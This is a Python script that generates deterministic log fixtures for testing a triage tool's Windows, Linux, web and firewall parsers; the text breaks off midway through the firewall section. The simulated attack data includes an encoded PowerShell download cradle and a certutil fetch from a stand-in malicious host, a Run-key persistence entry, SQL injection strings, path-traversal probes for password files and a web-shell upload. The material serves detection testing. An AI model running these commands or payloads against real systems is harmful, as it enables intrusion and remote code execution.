"""Generate the Windows parser test fixtures (spec 09 section 2, spec 11 Phase 2).

Deterministic by construction: every byte written here is a literal below, so two
runs produce identical files and a golden is only ever changed deliberately. Run
from ``backend``::

    python scripts/make_fixtures.py                 # (re)write fixtures
    python scripts/make_fixtures.py --update-golden # refresh .expected.json
    python scripts/make_fixtures.py --check         # fail if anything differs

The XML fixtures are authored here, which spec 09 explicitly allows ("obtained or
authored by a documented method"). The binary ``.evtx`` fixtures cannot be
authored in pure Python without a binXML writer, so they are copied from a source
directory of real samples; provenance is recorded in
``tests/fixtures/evtx/PROVENANCE.md``. Pass ``--evtx-source DIR`` (or set
``TRIAGELENS_EVTX_SOURCE``) to refresh them; without it the script leaves any
already-committed binaries untouched.
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
from collections.abc import Callable, Iterable
from pathlib import Path

BACKEND_ROOT = Path(__file__).resolve().parents[1]
FIXTURES_DIR = BACKEND_ROOT / "tests" / "fixtures" / "evtx"
LINUX_DIR = BACKEND_ROOT / "tests" / "fixtures" / "linux"
WEB_DIR = BACKEND_ROOT / "tests" / "fixtures" / "web"
FW_DIR = BACKEND_ROOT / "tests" / "fixtures" / "fw"
GENERIC_DIR = BACKEND_ROOT / "tests" / "fixtures" / "generic"
sys.path.insert(0, str(BACKEND_ROOT))

from app.ingest.events import EVENT_COLUMNS, NormalizedEvent  # noqa: E402
from app.ingest.parsers.base import ParseContext  # noqa: E402
from app.ingest.parsers.fw_cisco_asa import FwCiscoAsaParser  # noqa: E402
from app.ingest.parsers.fw_fortinet import FwFortinetParser  # noqa: E402
from app.ingest.parsers.fw_iptables import FwIptablesParser  # noqa: E402
from app.ingest.parsers.fw_paloalto import FwPaloaltoParser  # noqa: E402
from app.ingest.parsers.fw_pfsense import FwPfsenseParser  # noqa: E402
from app.ingest.parsers.generic_csv import GenericCsvParser  # noqa: E402
from app.ingest.parsers.generic_json import GenericJsonParser  # noqa: E402
from app.ingest.parsers.iis_w3c import IisW3cParser  # noqa: E402
from app.ingest.parsers.linux_auditd import LinuxAuditdParser  # noqa: E402
from app.ingest.parsers.linux_journald import LinuxJournaldParser  # noqa: E402
from app.ingest.parsers.linux_syslog import LinuxAuthParser, LinuxSyslogParser  # noqa: E402
from app.ingest.parsers.web_access import ApacheAccessParser, NginxAccessParser  # noqa: E402
from app.ingest.parsers.web_error import ApacheErrorParser, NginxErrorParser  # noqa: E402
from app.ingest.parsers.windows_event_xml import WindowsEventXmlParser  # noqa: E402
from app.ingest.parsers.windows_evtx import WindowsEvtxParser  # noqa: E402

#: The Windows events namespace, present on every authored export.
_NS = "http://schemas.microsoft.com/win/2004/08/events/event"

SECURITY = "Security"
AUDIT = "Microsoft-Windows-Security-Auditing"
SYSMON = "Microsoft-Windows-Sysmon/Operational"
SYSMON_PROVIDER = "Microsoft-Windows-Sysmon"
POWERSHELL = "Microsoft-Windows-PowerShell/Operational"
PS_PROVIDER = "Microsoft-Windows-PowerShell"


def event(
    *,
    event_id: int,
    channel: str,
    provider: str,
    record_id: int,
    computer: str = "DC01",
    level: int = 0,
    time_created: str = "2026-03-01T12:00:00.000000Z",
    user_data: str = "",
    data: dict[str, str] | None = None,
) -> str:
    """One ``<Event>`` element as text, mirroring what ``wevtutil`` emits."""
    fields = data or {}
    data_xml = "".join(f'<Data Name="{name}">{value}</Data>' for name, value in fields.items())
    return (
        "<Event>"
        "<System>"
        f'<Provider Name="{provider}"/>'
        f"<EventID>{event_id}</EventID>"
        f"<Level>{level}</Level>"
        f'<TimeCreated SystemTime="{time_created}"/>'
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Channel>{channel}</Channel>"
        f"<Computer>{computer}</Computer>"
        '<Execution ProcessID="1234" ThreadID="1"/>'
        "</System>"
        f"<EventData>{data_xml}</EventData>"
        f"{user_data}"
        "</Event>"
    )


def _document(events: list[str]) -> str:
    """Wrap events in the ``<Events>`` root the parser expects."""
    body = "\n".join(events)
    return f'<?xml version="1.0" encoding="utf-8"?>\n<Events xmlns="{_NS}">\n{body}\n</Events>\n'


#: 4625 failures: a spray from one address, plus one from another (spec 09 P-06).
_LOGON_FAILURES: list[tuple[str, str]] = [
    ("admin", "198.51.100.77"),
    ("root", "198.51.100.77"),
    ("administrator", "198.51.100.77"),
    ("admin", "198.51.100.99"),
]


def security_logons() -> str:
    """Logon, failure, process-creation, task and account events (spec 09 P-06)."""
    events = [
        event(
            event_id=4624,
            channel=SECURITY,
            provider=AUDIT,
            record_id=1001,
            data={
                "LogonType": "2",
                "TargetUserName": "alice",
                "TargetDomainName": "CORP",
                "IpAddress": "127.0.0.1",
                "LogonProcessName": "User32",
            },
        ),
        event(
            event_id=4624,
            channel=SECURITY,
            provider=AUDIT,
            record_id=1002,
            data={
                "LogonType": "3",
                "TargetUserName": "bob",
                "IpAddress": "203.0.113.10",
                "IpPort": "44322",
            },
        ),
        event(
            event_id=4624,
            channel=SECURITY,
            provider=AUDIT,
            record_id=1003,
            data={
                "LogonType": "10",
                "TargetUserName": "carol",
                "IpAddress": "::ffff:203.0.113.11",
                "IpPort": "52001",
            },
        ),
        *(
            event(
                event_id=4625,
                channel=SECURITY,
                provider=AUDIT,
                record_id=1100 + index,
                data={
                    "LogonType": "3",
                    "TargetUserName": user,
                    "IpAddress": ip,
                    "IpPort": str(50000 + index),
                },
            )
            for index, (user, ip) in enumerate(_LOGON_FAILURES)
        ),
        event(
            event_id=4688,
            channel=SECURITY,
            provider=AUDIT,
            record_id=2001,
            data={
                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c whoami",
                "ParentProcessName": "C:\\Windows\\explorer.exe",
            },
        ),
        event(
            event_id=4698,
            channel=SECURITY,
            provider=AUDIT,
            record_id=2002,
            data={
                "TaskName": "\\Updater",
                "TaskContent": "<Task><Actions><Exec><Command>powershell</Command>"
                "<Arguments>-enc SQBFAFgA</Arguments></Exec></Actions></Task>",
            },
        ),
        event(
            event_id=4720,
            channel=SECURITY,
            provider=AUDIT,
            record_id=2003,
            data={
                "TargetUserName": "svc-backup",
                "TargetDomainName": "DC01",
                "SubjectUserName": "admin",
            },
        ),
        event(
            event_id=1102,
            channel=SECURITY,
            provider=AUDIT,
            record_id=2004,
            user_data=(
                '<UserData><LogFileCleared xmlns="http://schemas.microsoft.com/'
                'win/2004/08/events"><SubjectUserName>admin</SubjectUserName>'
                "<SubjectDomainName>DC01</SubjectDomainName></LogFileCleared></UserData>"
            ),
        ),
    ]
    return _document(events)


def sysmon_attack() -> str:
    """Sysmon process, network, file, registry and DNS events (spec 09 P-07)."""
    events = [
        event(
            event_id=1,
            channel=SYSMON,
            provider=SYSMON_PROVIDER,
            computer="WS01",
            level=4,
            record_id=3001,
            data={
                "UtcTime": "2026-03-01 12:05:00.000",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -nop -w hidden -enc "
                "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8v"
                "bWFsaWNpb3VzLXVwZGF0ZS5leGFtcGxlLm9yZy9hLnBzMScp",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Hashes": "MD5=AAAA1111, SHA256=BBBB2222",
            },
        ),
        event(
            event_id=3,
            channel=SYSMON,
            provider=SYSMON_PROVIDER,
            computer="WS01",
            level=4,
            record_id=3002,
            data={
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "DestinationIp": "192.0.2.66",
                "DestinationPort": "443",
                "DestinationHostname": "malicious-update.example.org",
                "Protocol": "tcp",
            },
        ),
        event(
            event_id=11,
            channel=SYSMON,
            provider=SYSMON_PROVIDER,
            computer="WS01",
            level=4,
            record_id=3003,
            data={
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "TargetFilename": "C:\\Users\\victim\\AppData\\Local\\Temp\\a.exe",
            },
        ),
        event(
            event_id=13,
            channel=SYSMON,
            provider=SYSMON_PROVIDER,
            computer="WS01",
            level=4,
            record_id=3004,
            data={
                "EventType": "SetValue",
                "Image": "C:\\Windows\\System32\\reg.exe",
                "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "Details": "C:\\Users\\victim\\AppData\\Local\\Temp\\a.exe",
            },
        ),
        event(
            event_id=22,
            channel=SYSMON,
            provider=SYSMON_PROVIDER,
            computer="WS01",
            level=4,
            record_id=3005,
            data={
                "Image": "C:\\Windows\\System32\\nslookup.exe",
                "QueryName": "malicious-update.example.org",
                "QueryResults": "192.0.2.66",
                "Status": "0",
            },
        ),
    ]
    return _document(events)


def powershell_4104() -> str:
    """A PowerShell script-block log with a base64 downloader (spec 09 P-07)."""
    events = [
        event(
            event_id=4104,
            channel=POWERSHELL,
            provider=PS_PROVIDER,
            computer="WS01",
            level=5,
            record_id=4001,
            data={
                "ScriptBlockId": "11111111-2222-3333-4444-555555555555",
                "MessageNumber": "1",
                "MessageTotal": "1",
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://"
                "malicious-update.example.org/a.ps1')",
            },
        ),
    ]
    return _document(events)


#: XML fixtures authored deterministically, by file name.
TEXT_FIXTURES: dict[str, str] = {
    "security_logons.xml": security_logons(),
    "sysmon_attack.xml": sysmon_attack(),
    "powershell_4104.xml": powershell_4104(),
}

#: Binary fixtures copied from a real sample directory, destination -> source name.
BINARY_FIXTURES: dict[str, str] = {
    "security_logons.evtx": "Security_short_selected.evtx",
    "account_changes.evtx": "new-user-security.evtx",
    "sysmon_attack.evtx": "sysmon_k3.evtx",
}

# ---------------------------------------------------------------------------
# Linux fixtures (spec 09 section 2, spec 11 Phase 3)
# ---------------------------------------------------------------------------

#: The users a brute-force spray cycles through (spec 09 Scenario A).
_SCENARIO_USERS = ["admin", "test", "oracle", "ubuntu", "root"]


def _lines(*rows: str) -> str:
    """Join fixture rows with a trailing newline, the way a log file ends."""
    return "\n".join(rows) + "\n"


def linux_auth_log() -> str:
    """Scenario A: a spray from one address, then a successful root login, then noise.

    RFC 3164 lines carry no year, so the fixture is only deterministic when read
    with ``assumed_year=2025`` (see :data:`LINUX_ASSUMED_YEAR`).
    """
    rows = [
        f"Mar  1 12:00:{1 + index:02d} web01 sshd[{1200 + index}]: Failed password for "
        f"{_SCENARIO_USERS[index % len(_SCENARIO_USERS)]} from 185.220.101.45 "
        f"port {40001 + index} ssh2"
        for index in range(14)
    ]
    rows += [
        "Mar  1 12:00:15 web01 sshd[1300]: Invalid user admin from 185.220.101.45 port 40015",
        (
            "Mar  1 12:00:20 web01 sshd[1301]: Accepted password for root from "
            "185.220.101.45 port 51890 ssh2"
        ),
        (
            "Mar  1 12:00:25 web01 sshd[1301]: Received disconnect from 185.220.101.45 "
            "port 51890:11: Bye Bye [preauth]"
        ),
        (
            "Mar  1 12:05:00 web01 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; "
            "COMMAND=/usr/sbin/useradd svc_backup"
        ),
        (
            "Mar  1 12:05:01 web01 useradd[1260]: new user: name=svc_backup, UID=1001, "
            "GID=1001, home=/home/svc_backup, shell=/bin/bash"
        ),
        (
            "Mar  1 12:06:00 web01 su[1400]: pam_unix(su:session): session opened for "
            "user root by alice(uid=1000)"
        ),
        "Mar  1 13:00:00 web01 CRON[1500]: (root) CMD (/usr/local/bin/backup.sh)",
    ]
    return _lines(*rows)


def linux_syslog_variants() -> str:
    """All three framings, a continuation, and one line nothing can frame."""
    return _lines(
        "Mar  2 08:00:00 web01 systemd[1]: Started Daily apt upgrade and clean activities.",
        "Mar  2 08:00:01 web01 app[2000]: first line of a multi-line message",
        "    second line of the message",
        "    third line of the message",
        "2026-03-02T08:00:02Z web01 kernel: usb 1-1: new high-speed USB device",
        "2026-03-02T08:00:03.500+02:00 web01 nginx[2100]: GET /index.html 200",
        "<165>1 2026-03-02T08:00:04Z web01 nginx 2100 ID47 - request processed",
        "<134>1 2026-03-02T08:00:05.250Z web01 app 2200 - - structured message",
        "this line matches no framing and must become a failure",
        "Mar  2 08:00:06 web01 sshd[1200]: Failed password for test from "
        "198.51.100.9 port 33000 ssh2",
    )


def linux_journal() -> str:
    """``journalctl -o json`` records, including a byte-array ``MESSAGE``."""
    rows = [
        (
            '{"__REALTIME_TIMESTAMP":"1740909601000000","_HOSTNAME":"web01",'
            '"SYSLOG_IDENTIFIER":"sshd","_PID":"1200","PRIORITY":"4",'
            '"MESSAGE":"Failed password for admin from 185.220.101.45 port 40001 ssh2"}'
        ),
        (
            '{"__REALTIME_TIMESTAMP":"1740909602000000","_HOSTNAME":"web01",'
            '"SYSLOG_IDENTIFIER":"systemd","_PID":"1","PRIORITY":"6",'
            '"MESSAGE":[104,101,108,108,111,32,119,111,114,108,100]}'
        ),
        (
            '{"__REALTIME_TIMESTAMP":"1740909603000000","_HOSTNAME":"web01",'
            '"SYSLOG_IDENTIFIER":"kernel","PRIORITY":"7","_EXE":"/usr/bin/bash",'
            '"_CMDLINE":"bash -c echo hi","MESSAGE":"audit: type=1006 audit(1.2:3):"}'
        ),
    ]
    return _lines(*rows)


def linux_audit() -> str:
    """Audit groups: an exec with hex argv, a connect, and a failed login."""
    return _lines(
        "type=SYSCALL msg=audit(1740909601.000:7001): arch=c000003e syscall=59 "
        "success=yes exit=0 a0=7ffd a1=7ffd a2=7ffd a3=7ffd items=2 ppid=900 pid=901 "
        'auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=1 comm="cat" exe="/usr/bin/cat" key="exec"',
        'type=EXECVE msg=audit(1740909601.000:7001): argc=3 a0="cat" '
        'a1="2F6574632F706173737764" a2="/etc/hosts"',
        'type=CWD msg=audit(1740909601.000:7001): cwd="/root"',
        'type=PATH msg=audit(1740909601.000:7001): item=0 name="/etc/passwd" '
        "inode=100 odev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL",
        'type=PATH msg=audit(1740909601.000:7001): item=1 name="/etc/hosts" '
        "inode=101 odev=fd:00 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL",
        "type=SYSCALL msg=audit(1740909602.000:7002): arch=c000003e syscall=42 "
        "success=yes exit=0 a0=3 a1=7ffc a2=10 a3=7ffc items=0 ppid=900 pid=902 "
        'auid=1000 uid=0 gid=0 euid=0 tty=pts0 ses=1 comm="curl" exe="/usr/bin/curl" key="network"',
        "type=SOCKADDR msg=audit(1740909602.000:7002): saddr=0200C350C000020A",
        "type=USER_AUTH msg=audit(1740909603.000:7003): pid=903 uid=0 "
        "auid=4294967295 ses=4294967295 subj=unconfined "
        'msg=\'op=PAM:authentication grantors=pam_unix acct="admin" '
        'exe="/usr/sbin/sshd" hostname=? addr=203.0.113.9 terminal=ssh res=failed\'',
        "type=USER_LOGIN msg=audit(1740909603.000:7003): pid=903 uid=0 "
        "auid=4294967295 ses=4294967295 subj=unconfined "
        'msg=\'op=login acct="admin" exe="/usr/sbin/sshd" '
        "hostname=? addr=203.0.113.9 terminal=ssh res=failed'",
    )


#: Authored Linux fixtures, file name -> content.
LINUX_FIXTURES: dict[str, str] = {
    "auth.log": linux_auth_log(),
    "syslog_variants.log": linux_syslog_variants(),
    "journal.json": linux_journal(),
    "audit.log": linux_audit(),
}

#: The seed year the RFC 3164 fixture needs to be deterministic (spec 09 P-05).
LINUX_ASSUMED_YEAR = 2025

# ---------------------------------------------------------------------------
# Web fixtures (spec 09 section 2, spec 11 Phase 4)
# ---------------------------------------------------------------------------

#: The scanner address Scenario B singles out (spec 09 section 6).
_SCENARIO_ATTACKER = "45.155.205.233"

#: The scanner's user agent, as it appears in the access fixture.
_SQLMAP_UA = "sqlmap/1.7 (http://sqlmap.org)"

#: How many benign requests open the access fixture (spec 09 Scenario B: 200+).
_BENIGN_REQUESTS = 202

#: One SQLi payload is percent-encoded so P-09 can assert the raw/decoded pair.
_SQLI_PAYLOADS = [
    "/product.php?id=1' or 1=1--",
    "/product.php?id=1 union select 1,2,3--",
    "/search?q=1' OR '1'='1",
    "/product.php?id=1%27%20OR%20%271%27%3D%271",
    "/news.php?id=1' AND sleep(5)--",
]

_TRAVERSAL_PAYLOADS = [
    "/../../etc/passwd",
    "/..%2f..%2fetc/passwd",
    "/static/../../etc/shadow",
]


def _lines(*rows: str) -> str:
    """Join fixture rows with a trailing newline, the way a log file ends."""
    return "\n".join(rows) + "\n"


def _combined(ts: str, request: str, status: int, size: int, *, ip: str, user_agent: str) -> str:
    """One Apache/nginx combined line with the trailing referer."""
    return f'{ip} - - [{ts}] "{request}" {status} {size} "-" "{user_agent}"'


def web_access_combined() -> str:
    """Scenario B: benign traffic, then a sqlmap burst, traversal, a shell, junk.

    The attack is ``45.155.205.233`` with a ``sqlmap/1.7`` agent: fifteen SQLi
    requests (one percent-encoded), three path-traversal probes, and one
    ``POST /uploads/shell.php`` that succeeds. Two malformed request fields
    exercise the fallback framing.
    """
    rows = []
    for index in range(_BENIGN_REQUESTS):
        ip = ["192.0.2.10", "192.0.2.11", "192.0.2.12"][index % 3]
        path = ["/", "/index.html", "/assets/app.js", "/api/status"][index % 4]
        ts = f"01/Mar/2026:09:{index // 60:02d}:{index % 60:02d} +0000"
        rows.append(
            _combined(ts, f"GET {path} HTTP/1.1", 200, 512, ip=ip, user_agent="Mozilla/5.0")
        )
    for index in range(15):
        payload = _SQLI_PAYLOADS[index % len(_SQLI_PAYLOADS)]
        ts = f"01/Mar/2026:10:{index:02d}:00 +0000"
        rows.append(
            _combined(
                ts,
                f"GET {payload} HTTP/1.1",
                200,
                1024 + index,
                ip=_SCENARIO_ATTACKER,
                user_agent=_SQLMAP_UA,
            )
        )
    for index, payload in enumerate(_TRAVERSAL_PAYLOADS):
        ts = f"01/Mar/2026:10:20:0{index} +0000"
        rows.append(
            _combined(
                ts,
                f"GET {payload} HTTP/1.1",
                404,
                0,
                ip=_SCENARIO_ATTACKER,
                user_agent=_SQLMAP_UA,
            )
        )
    rows.append(
        _combined(
            "01/Mar/2026:10:30:00 +0000",
            "POST /uploads/shell.php HTTP/1.1",
            200,
            1337,
            ip="45.155.205.233",
            user_agent="sqlmap/1.7 (http://sqlmap.org)",
        )
    )
    rows.append('198.51.100.5 - - [01/Mar/2026:11:00:00 +0000] "-" 400 0 "-" "-"')
    rows.append('198.51.100.5 - - [01/Mar/2026:11:00:01 +0000] "not a request" 400 0 "-" "-"')
    return _lines(*rows)


def web_nginx_access() -> str:
    """A small nginx access log, so detection can route by the filename hint."""
    return _lines(
        '192.0.2.30 - - [01/Mar/2026:12:00:00 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/8.0"',
        '192.0.2.31 - - [01/Mar/2026:12:00:01 +0000] "GET /health HTTP/1.1" 200 15 "-" "curl/8.0"',
        '192.0.2.32 - - [01/Mar/2026:12:00:02 +0000] "GET /none HTTP/1.1" 404 153 "-" "curl/8.0"',
    )


def web_nginx_error() -> str:
    """nginx error lines: error, warn and crit, one naming a client and request."""
    return _lines(
        '2026/03/01 12:00:00 [error] 1234#0: *1 open() "/var/www/missing" failed '
        "(2: No such file or directory), client: 203.0.113.5, server: example.org, "
        'request: "GET /missing HTTP/1.1", host: "example.org"',
        "2026/03/01 12:00:01 [warn] 1234#0: *2 an upstream response is buffered "
        "to a temporary file while reading upstream",
        "2026/03/01 12:00:02 [crit] 1235#0: *3 SSL_do_handshake() failed (SSL: "
        "error:14094410), client: 203.0.113.6, server: example.org",
    )


def web_apache_error() -> str:
    """Apache 2.4 error lines, with and without microseconds and a client."""
    return _lines(
        "[Wed Oct 01 12:00:00.123456 2025] [core:error] [pid 100:tid 5] "
        "[client 203.0.113.5:55000] AH00124: Request exceeded the limit",
        "[Wed Oct 01 12:00:01.000000 2025] [mpm_prefork:notice] [pid 100:tid 6] "
        "AH00163: Apache/2.4.58 (Unix) configured -- resuming normal operations",
        "[Wed Oct 01 12:00:02 2025] [rewrite:warn] [pid 101] [client 203.0.113.7] "
        "AH10000: rewrite rule matched",
    )


def web_iis() -> str:
    """One IIS W3C file: a ``#Fields`` header and rows that honour it."""
    return _lines(
        "#Software: Microsoft Internet Information Services 10.0",
        "#Version: 1.0",
        "#Date: 2026-03-01 12:00:00",
        "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port "
        "cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken",
        "2026-03-01 12:00:00 192.0.2.20 GET /Default.htm - 80 - 203.0.113.7 "
        "Mozilla/5.0+(Windows+NT+10.0) 200 0 0 34",
        "2026-03-01 12:00:01 192.0.2.20 GET /admin/login.aspx returnurl=%2Fhome 80 "
        "- 203.0.113.7 Mozilla/5.0+(Windows+NT+10.0) 302 0 0 12",
        "2026-03-01 12:00:02 192.0.2.20 POST /api/upload - 80 CORP%5Calice 203.0.113.7 "
        "curl/8.0 401 2 5 3",
    )


#: Authored web fixtures, file name -> content.
WEB_FIXTURES: dict[str, str] = {
    "access_combined.log": web_access_combined(),
    "nginx_access.log": web_nginx_access(),
    "nginx_error.log": web_nginx_error(),
    "apache_error.log": web_apache_error(),
    "iis.log": web_iis(),
}

# ---------------------------------------------------------------------------
# Firewall fixtures (spec 09 section 2, spec 11 Phase 4)
# ---------------------------------------------------------------------------

#: The ports a port scan sweeps in Scenario C's companion UFW data.
_SCAN_PORTS = [22, 23, 80, 443, 3306, 3389, 445, 1433, 8080, 5900, 21, 25, 110, 143]

#: The scan source, reusing the Scenario B attacker (spec 09 section 6).
_SCAN_SOURCE = "45.155.205.233"

#: IPv4 vs IPv6, for the pfSense and PAN-OS fixture builders.
_IPV4 = 4


def fw_ufw() -> str:
    """UFW kernel lines: a port sweep, two allows, and two malformed lines."""
    rows = []
    for index, port in enumerate(_SCAN_PORTS):
        rows.append(
            f"Mar  1 12:00:{index:02d} fw01 kernel: [{12000 + index}.100] [UFW BLOCK] "
            "IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd "
            f"SRC={_SCAN_SOURCE} DST=10.0.0.5 LEN=60 TTL=64 "
            f"PROTO=TCP SPT={40001 + index} DPT={port} WINDOW=64240 RES=0x00 SYN URGP=0"
        )
    rows.append(
        "Mar  1 12:01:00 fw01 kernel: [12400.100] [UFW ALLOW] IN=eth0 OUT= "
        "MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=10.0.0.5 DST=198.51.100.53 "
        "LEN=52 TTL=64 PROTO=TCP SPT=51000 DPT=443 WINDOW=64240 RES=0x00 ACK URGP=0"
    )
    rows.append(
        "Mar  1 12:01:01 fw01 kernel: [12401.200] [UFW ALLOW] IN=eth0 OUT= "
        "MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=10.0.0.5 DST=198.51.100.53 "
        "LEN=76 TTL=64 PROTO=UDP SPT=52000 DPT=53 WINDOW=0 RES=0x00 URGP=0"
    )
    rows.append("Mar  1 12:02:00 fw01 kernel: [12500.100] [UFW BLOCK] IN=eth0 SRC=10.0.0.9")
    rows.append("Mar  1 12:02:01 fw01 kernel: this is not a firewall line")
    return _lines(*rows)


def _pfsense(
    version: int,
    *,
    action: str,
    proto_name: str,
    proto_id: int,
    src: str,
    dst: str,
    sport: str,
    dport: str,
    serial: int,
) -> str:
    """One syslog-framed pfSense ``filterlog`` record."""
    common = [str(serial), "", "", "1000000103", "em0", "match", action, "in", str(version)]
    if version == _IPV4:
        tail = [
            "0x0",
            "",
            "64",
            "0",
            "0",
            "DF",
            str(proto_id),
            proto_name,
            "60",
            src,
            dst,
            sport,
            dport,
            "",
        ]
    else:
        tail = ["0x00", "0x00000", "64", proto_name, str(proto_id), "60", src, dst, sport, dport]
    return f"Mar  1 12:00:{serial:02d} fw01 filterlog[{500 + serial}]: " + ",".join(
        [*common, *tail]
    )


def fw_pfsense() -> str:
    """pfSense filterlog: IPv4 and IPv6, block/pass, and two malformed lines."""
    return _lines(
        _pfsense(
            4,
            action="block",
            proto_name="tcp",
            proto_id=6,
            src=_SCAN_SOURCE,
            dst="10.0.0.5",
            sport="40001",
            dport="22",
            serial=0,
        ),
        _pfsense(
            4,
            action="block",
            proto_name="tcp",
            proto_id=6,
            src=_SCAN_SOURCE,
            dst="10.0.0.5",
            sport="40002",
            dport="80",
            serial=1,
        ),
        _pfsense(
            4,
            action="block",
            proto_name="tcp",
            proto_id=6,
            src=_SCAN_SOURCE,
            dst="10.0.0.5",
            sport="40003",
            dport="445",
            serial=2,
        ),
        _pfsense(
            4,
            action="pass",
            proto_name="udp",
            proto_id=17,
            src="10.0.0.5",
            dst="198.51.100.53",
            sport="52000",
            dport="53",
            serial=3,
        ),
        _pfsense(
            4,
            action="block",
            proto_name="icmp",
            proto_id=1,
            src="10.0.0.5",
            dst="192.0.2.66",
            sport="",
            dport="",
            serial=4,
        ),
        _pfsense(
            6,
            action="block",
            proto_name="tcp",
            proto_id=6,
            src="2001:db8::1",
            dst="2001:db8::2",
            sport="40001",
            dport="22",
            serial=5,
        ),
        _pfsense(
            6,
            action="block",
            proto_name="tcp",
            proto_id=6,
            src="2001:db8::1",
            dst="2001:db8::2",
            sport="40002",
            dport="443",
            serial=6,
        ),
        _pfsense(
            6,
            action="pass",
            proto_name="udp",
            proto_id=17,
            src="2001:db8::2",
            dst="2001:db8::53",
            sport="52000",
            dport="53",
            serial=7,
        ),
        "Mar  1 12:00:08 fw01 filterlog[500]: 5,,,1000000103,em0,match,block",
        "Mar  1 12:00:09 fw01 not a filterlog line",
    )


def fw_fortinet() -> str:
    """FortiGate key=value: quoted values, denies and allows, a URL, and noise."""
    return _lines(
        'date=2026-03-01 time=12:00:00 devname="FW01" type=traffic subtype=forward '
        f"srcip={_SCAN_SOURCE} dstip=10.0.0.5 srcport=40001 dstport=22 proto=6 action=deny "
        "policyid=1 logid=0000000013 level=notice",
        'date=2026-03-01 time=12:00:01 devname="FW01" type=traffic subtype=forward '
        f"srcip={_SCAN_SOURCE} dstip=10.0.0.5 srcport=40002 dstport=80 proto=6 action=deny "
        "policyid=1 logid=0000000013 level=notice",
        'date=2026-03-01 time=12:00:02 devname="FW01" type=traffic subtype=forward '
        "srcip=10.0.0.5 dstip=198.51.100.53 srcport=51000 dstport=443 proto=6 action=accept "
        "policyid=2 logid=0000000013 level=notice service=HTTPS",
        'date=2026-03-01 time=12:00:03 devname="FW01" type=traffic subtype=forward '
        "srcip=10.0.0.5 dstip=198.51.100.53 srcport=52000 dstport=53 proto=17 action=accept "
        "policyid=3 logid=0000000013 level=notice service=DNS",
        'date=2026-03-01 time=12:00:04 devname="FW01" type=utm subtype=webfilter '
        "srcip=10.0.0.5 dstip=203.0.113.66 srcport=53000 dstport=80 proto=6 action=block "
        'user="alice" url="http://malware.example/payload.exe" level=warning',
        'date=2026-03-01 time=12:00:05 devname="FW01" type=traffic subtype=forward '
        f"srcip={_SCAN_SOURCE} dstip=10.0.0.5 srcport=40004 dstport=3389 proto=6 action=deny "
        "policyid=1 logid=0000000013 level=notice",
        'date=2026-03-01 time=12:00:06 devname="FW01" type=traffic action=deny',
    )


def _pan(fields: list[str]) -> str:
    """One PAN-OS CSV row."""
    return ",".join(fields)


def fw_paloalto() -> str:
    """PAN-OS traffic and threat rows, plus a short (malformed) row."""
    return _lines(
        _pan(
            [
                "1",
                "2026/03/01 12:00:00",
                "0011",
                "TRAFFIC",
                "end",
                "2026/03/01 12:00:00",
                _SCAN_SOURCE,
                "10.0.0.5",
                "0.0.0.0",
                "0.0.0.0",
                "scan-deny",
                "-",
                "-",
                "web-browsing",
                "vsys1",
                "untrust",
                "trust",
                "ethernet1/1",
                "ethernet1/2",
                "log-forward",
                "0",
                "70001",
                "1",
                "40001",
                "22",
                "0",
                "0",
                "0x4000",
                "tcp",
                "deny",
                "-",
            ]
        ),
        _pan(
            [
                "1",
                "2026/03/01 12:00:01",
                "0011",
                "TRAFFIC",
                "end",
                "2026/03/01 12:00:01",
                "10.0.0.5",
                "198.51.100.53",
                "0.0.0.0",
                "0.0.0.0",
                "allow-web",
                "alice",
                "-",
                "ssl",
                "vsys1",
                "trust",
                "untrust",
                "ethernet1/2",
                "ethernet1/1",
                "log-forward",
                "0",
                "70002",
                "1",
                "51000",
                "443",
                "0",
                "0",
                "0x4000",
                "tcp",
                "allow",
                "-",
            ]
        ),
        _pan(
            [
                "1",
                "2026/03/01 12:00:03",
                "0011",
                "TRAFFIC",
                "end",
                "2026/03/01 12:00:03",
                _SCAN_SOURCE,
                "10.0.0.5",
                "0.0.0.0",
                "0.0.0.0",
                "scan-deny",
                "-",
                "-",
                "ssh",
                "vsys1",
                "untrust",
                "trust",
                "ethernet1/1",
                "ethernet1/2",
                "log-forward",
                "0",
                "70003",
                "1",
                "40003",
                "22",
                "0",
                "0",
                "0x4000",
                "tcp",
                "drop",
                "-",
            ]
        ),
        _pan(
            [
                "1",
                "2026/03/01 12:01:00",
                "0011",
                "THREAT",
                "url",
                "2026/03/01 12:01:00",
                "10.0.0.5",
                "203.0.113.66",
                "0.0.0.0",
                "0.0.0.0",
                "malware-block",
                "alice",
                "-",
                "web-browsing",
                "vsys1",
                "trust",
                "untrust",
                "ethernet1/2",
                "ethernet1/1",
                "log-forward",
                "0",
                "70004",
                "1",
                "52000",
                "80",
                "0",
                "0",
                "0x4000",
                "tcp",
                "block-url",
                "http://malware.example/payload.exe",
                "86202",
                "malware",
                "high",
            ]
        ),
        _pan(
            [
                "1",
                "2026/03/01 12:01:01",
                "0011",
                "THREAT",
                "vulnerability",
                "2026/03/01 12:01:01",
                _SCAN_SOURCE,
                "10.0.0.5",
                "0.0.0.0",
                "0.0.0.0",
                "exploit-deny",
                "-",
                "-",
                "smb",
                "vsys1",
                "untrust",
                "trust",
                "ethernet1/1",
